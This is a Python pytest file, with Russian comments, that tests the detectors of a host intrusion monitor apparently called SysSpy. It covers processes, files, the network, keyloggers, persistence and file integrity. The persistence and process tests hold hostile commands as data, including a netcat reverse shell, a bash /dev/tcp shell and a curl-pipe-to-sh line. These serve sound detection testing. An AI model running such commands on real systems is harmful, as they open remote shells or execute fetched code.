"""Интеграционные тесты детекторов SysSpy.

Каждый тест симулирует реалистичную угрозу и проверяет, что соответствующий
детектор её находит. Часть сценариев отыгрывается на настоящей системе
(фоновый процесс в /tmp, слушающий порт, файл во временном каталоге), а часть,
требующая прав root или реального железа (устройства ввода, /proc/modules), —
через направленный мокинг внутренних чтений. Запускать достаточно от обычного
пользователя:

    python -m pytest -q
"""

import os
import shutil
import socket
import subprocess
import sys
import tempfile
import time
import unittest.mock as mock

import pytest

from sysspy import detectors
from sysspy.config import Config
from sysspy.state import State


@pytest.fixture
def env(tmp_path):
    """Свежий Config + State с временной БД, изолированной от реальной."""
    db = tmp_path / "sysspy_test.db"
    config = Config()
    config.db_path = str(db)
    state = State(str(db))
    yield config, state
    state.close()


# --------------------------------------------------------------------------- #
# процессы
# --------------------------------------------------------------------------- #

def test_processes_suspicious_exe(env):
    """Скрытый фоновый процесс с исполняемым файлом в /tmp."""
    config, state = env
    # Копируем Python (не multi-call бинарь), чтобы argv[0] не влиял на запуск.
    exe = os.path.join(tempfile.gettempdir(), f"sysspy_evil_{os.getpid()}.bin")
    shutil.copy(sys.executable, exe)
    os.chmod(exe, 0o755)
    proc = subprocess.Popen([exe, "-c", "import time; time.sleep(30)"])
    try:
        time.sleep(0.2)
        fs = detectors.processes.scan(state, config)
    finally:
        proc.terminate()
        proc.wait()
        os.remove(exe)
    assert any(
        f.category == "процессы"
        and "подозрительном расположении" in f.title
        and exe in f.detail
        for f in fs
    ), [f.detail for f in fs]


def test_processes_download_execute(env):
    """Живая команда вида curl ... | sh."""
    config, state = env
    proc = subprocess.Popen(
        ["/bin/sh", "-c", "echo 'curl http://example.com/x | sh'; sleep 30"]
    )
    try:
        time.sleep(0.2)
        fs = detectors.processes.scan(state, config)
    finally:
        proc.terminate()
        proc.wait()
    assert any(
        f.category == "процессы" and "загрузка и выполнение" in f.title
        for f in fs
    ), [f.detail for f in fs]


def test_processes_mask_systemd(env):
    """Процесс маскируется под systemd, но запущен из постороннего пути."""
    config, state = env
    # argv[0]="systemd", но реальный исполняемый файл — интерпретатор Python.
    proc = subprocess.Popen(
        ["systemd", "-c", "import time; time.sleep(30)"],
        executable=sys.executable,
    )
    try:
        time.sleep(0.2)
        fs = detectors.processes.scan(state, config)
    finally:
        proc.terminate()
        proc.wait()
    assert any(
        f.category == "процессы"
        and "маскируется под системный компонент" in f.title
        and str(proc.pid) in f.detail
        for f in fs
    ), [f.detail for f in fs]


def test_processes_high_cpu(env):
    """Процесс, жгущий CPU в период предполагаемого простоя."""
    config, state = env
    config.cpu_idle_threshold = 5.0
    proc = subprocess.Popen([sys.executable, "-c", "while True: pass"])
    try:
        time.sleep(0.2)
        fs = detectors.processes.scan(state, config)
    finally:
        proc.terminate()
        proc.wait()
    assert any(
        f.category == "процессы"
        and "Высокая загрузка CPU" in f.title
        and str(proc.pid) in f.detail
        for f in fs
    ), [f.detail for f in fs]


# --------------------------------------------------------------------------- #
# файлы
# --------------------------------------------------------------------------- #

def test_filesystem_temp_activity(env):
    """Свежий скрытый .so во временном каталоге."""
    config, state = env
    p = os.path.join(tempfile.gettempdir(), f".sysspy_payload_{os.getpid()}.so")
    with open(p, "w") as f:
        f.write("X")
    try:
        fs = detectors.filesystem.scan(state, config, days=1)
    finally:
        os.remove(p)
    hit = [
        f for f in fs
        if f.title == "Недавняя активность во временном каталоге"
        and p in f.detail
    ]
    assert hit, [f.detail for f in fs]
    assert hit[0].severity.value == "ВЫСОКИЙ"


def test_filesystem_watchdog_handler(env):
    """Обработчик real-time события дропает подозрительный файл."""
    config, state = env
    handler = detectors.filesystem._Handler(state, config)
    dropped = os.path.join(
        tempfile.gettempdir(), f"sysspy_drop_{os.getpid()}.so"
    )
    with open(dropped, "w") as f:
        f.write("X")
    os.chmod(dropped, 0o755)
    try:
        handler._check(dropped)
        fs = state.recent_findings()
    finally:
        os.remove(dropped)
    assert any(
        f.title == "Подозрительное событие с файлом" and dropped in f.detail
        for f in fs
    ), [f.detail for f in fs]


# --------------------------------------------------------------------------- #
# сеть
# --------------------------------------------------------------------------- #

def test_network_suspicious_listener(env):
    """Слушающий сокет на типичном C2-порту 31337."""
    config, state = env
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind(("0.0.0.0", 31337))
    except OSError:
        pytest.skip("порт 31337 занят")
    s.listen(1)
    try:
        fs = detectors.network.scan(state, config)
    finally:
        s.close()
    assert any(
        f.category == "сеть"
        and "Подозрительный прослушиваемый порт" in f.title
        and ":31337" in f.detail
        for f in fs
    ), [f.detail for f in fs]


# --------------------------------------------------------------------------- #
# ввод (кейлоггеры) — мокинг /proc, т.к. нужен root/железо
# --------------------------------------------------------------------------- #

def test_keylogger_input(env):
    """Процесс держит fd на /dev/input/event* (не из allow-списка)."""
    config, state = env
    pid = 99999
    with mock.patch.object(
        detectors.keylogger.utils, "iter_proc_pids", return_value=[pid]
    ), mock.patch.object(
        detectors.keylogger.os, "listdir", return_value=["3"]
    ), mock.patch.object(
        detectors.keylogger.os, "readlink", return_value="/dev/input/event0"
    ), mock.patch(
        "builtins.open", mock.mock_open(read_data="evilproc")
    ):
        fs = detectors.keylogger._scan_input(state, config)
    assert any(
        f.category == "ввод"
        and "читает устройство ввода" in f.title
        and str(pid) in f.detail
        for f in fs
    ), [f.detail for f in fs]


def test_keylogger_ptrace(env):
    """Процесс под отладкой (захвачен через ptrace)."""
    config, state = env
    pid = 88888
    status = "Name:\tevil\nTracerPid:\t1234\nState:\tS\n"
    with mock.patch.object(
        detectors.keylogger.utils, "iter_proc_pids", return_value=[pid]
    ), mock.patch("builtins.open", mock.mock_open(read_data=status)):
        fs = detectors.keylogger._scan_ptrace(state, config)
    assert any(
        f.category == "ввод"
        and "под отладкой (ptrace)" in f.title
        and str(pid) in f.detail
        and "1234" in f.detail
        for f in fs
    ), [f.detail for f in fs]


def test_keylogger_suspicious_module(env):
    """Подозрительное по имени ядерный модуль (rootkit/keylog)."""
    config, state = env
    modtext = (
        "myrootkit 16384 0 - Live 0xffffffff\n"
        "vboxdrv 24576 0 - Live 0xffffffff\n"
    )
    with mock.patch("builtins.open", mock.mock_open(read_data=modtext)):
        fs = detectors.keylogger._scan_modules(state, config)
    assert any(
        f.category == "ввод"
        and "Подозрительное имя модуля ядра" in f.title
        and "myrootkit" in f.detail
        for f in fs
    ), [f.detail for f in fs]


# --------------------------------------------------------------------------- #
# автозагрузка
# --------------------------------------------------------------------------- #

def test_persistence_flag():
    """Эвристика _flag находит типовые признаки вредоносной автозагрузки."""
    cases = [
        ("curl http://x | sh", ["загрузка", "конвейер"]),
        ("@reboot /tmp/backdoor.sh", ["@reboot", "временный"]),
        ("nc -e /bin/sh 1.2.3.4", ["netcat"]),
        ("bash -i > /dev/tcp/10.0.0.1/4444", ["шелл-трюки"]),
    ]
    for text, expected in cases:
        reasons = detectors.persistence._flag(text)
        for e in expected:
            assert any(e in r for r in reasons), f"{text!r} -> {reasons}"
    assert detectors.persistence._flag("echo hello world") == []


def test_persistence_systemd(env):
    """Подозрительный systemd-юнит, ссылающийся на /tmp."""
    config, state = env

    def fake_run(cmd):
        class R:
            returncode = 0
            stdout = ""
        r = R()
        if cmd[1] == "list-unit-files":
            r.stdout = "evil.service enabled\n"
        elif cmd[1] == "show":
            r.stdout = "FragmentPath=/tmp/evil.service\nExecStart=/tmp/evil\n"
        return r

    with mock.patch.object(detectors.persistence, "_run", side_effect=fake_run):
        fs = detectors.persistence._scan_systemd(config)
    assert any(
        f.title == "Подозрительный systemd-юнит" and "evil.service" in f.detail
        for f in fs
    ), [f.detail for f in fs]


# --------------------------------------------------------------------------- #
# целостность
# --------------------------------------------------------------------------- #

def test_integrity_change(env, tmp_path):
    """Изменение файла после создания базовой линии."""
    config, state = env
    target = tmp_path / "bin" / "fake"
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("original")
    with mock.patch.object(
        detectors.integrity, "_collect_targets", return_value=[str(target)]
    ):
        assert detectors.integrity.init_baseline(state, config) == 1
        target.write_text("modified contents")
        fs = detectors.integrity.check(state, config)
    assert any(
        f.category == "целостность"
        and "изменён" in f.title
        and str(target) in f.detail
        for f in fs
    ), [f.detail for f in fs]


def test_integrity_new_file(env, tmp_path):
    """Появление нового файла, отсутствовавшего в базовой линии."""
    config, state = env
    old = tmp_path / "bin" / "old"
    new = tmp_path / "bin" / "new"
    old.parent.mkdir(parents=True, exist_ok=True)
    old.write_text("original")
    with mock.patch.object(
        detectors.integrity, "_collect_targets", return_value=[str(old)]
    ):
        detectors.integrity.init_baseline(state, config)
    new.write_text("brand new")
    with mock.patch.object(
        detectors.integrity, "_collect_targets", return_value=[str(old), str(new)]
    ):
        fs = detectors.integrity.check(state, config)
    assert any(
        f.category == "целостность"
        and "Новый файл" in f.title
        and str(new) in f.detail
        for f in fs
    ), [f.detail for f in fs]
